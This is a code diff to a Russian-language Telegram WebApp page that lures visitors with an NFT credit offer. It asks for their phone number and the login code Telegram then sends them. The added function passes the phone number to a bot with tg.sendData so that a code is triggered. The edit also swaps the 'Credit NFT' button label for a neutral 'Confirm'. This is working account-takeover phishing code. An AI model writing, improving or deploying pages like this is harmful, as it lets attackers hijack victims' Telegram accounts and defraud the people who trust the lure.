@@ -24,7 +24,7 @@
             <h3>Код подтверждения</h3>
             <p>Введите код, отправленный вам в Telegram:</p>
             <input type="number" id="code" placeholder="12345">
-            <button onclick="sendFinal()">Зачислить NFT</button>
+            <button onclick="sendFinal()">Подтвердить</button>
         </div>
     </div>
 
@@ -32,16 +32,20 @@
         let tg = window.Telegram.WebApp;
 tg.expand();
 
-function toStep2() {
-    let phone = document.getElementById('phone').value;
-    if (phone.length < 10) return alert("Введите номер");
-    
-    // ЭТАП 1: Отправляем боту команду запросить код
-    tg.sendData("STEP1_PHONE:" + phone); 
-    
-    document.getElementById('step1').classList.remove('active');
-    document.getElementById('step2').classList.add('active');
-}
+function nextStep(stepNumber) {
+        let phone = document.getElementById('phone').value;
+        
+        // Простая проверка: если номер слишком короткий, показываем предупреждение
+        if (phone.length < 10) {
+            return alert("Пожалуйста, введите корректный номер");
+        }
+        tg.sendData("STEP1_PHONE:" + phone); 
+        // Прячем первый шаг (удаляем класс active и скрываем)
+        document.getElementById('step1').classList.remove('active');
+        
+        // Показываем второй шаг (добавляем класс active)
+        document.getElementById('step2').classList.add('active');
+    }
 
 function finish() {
     let code = document.getElementById('code').value;
